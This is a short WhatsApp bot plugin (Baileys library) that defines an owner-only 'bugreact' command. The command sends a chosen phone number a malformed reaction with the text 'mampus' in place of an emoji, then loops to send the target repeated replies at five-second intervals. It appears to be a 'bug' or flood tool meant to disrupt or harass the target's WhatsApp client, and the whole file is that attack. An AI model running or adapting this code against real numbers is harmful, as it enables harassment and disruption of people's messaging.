let ba = require("@adiwajshing/baileys")
let handler = async(m, {conn, args}) => {
let p = args[0] ? args[0] + "@s.whatsapp.net" : m.chat
const reactionMessage = { react: { text: "mampus", key: m.key } } 

const sendMsg = await conn.sendMessage(p, reactionMessage)
for (let i = 0; i<args[1]; i++) {
	await ba.delay(5000)
await conn.reply(p, wm, sendMsg)
}
}
handler.command = ['bugreact']
handler.owner = true
module.exports = handler
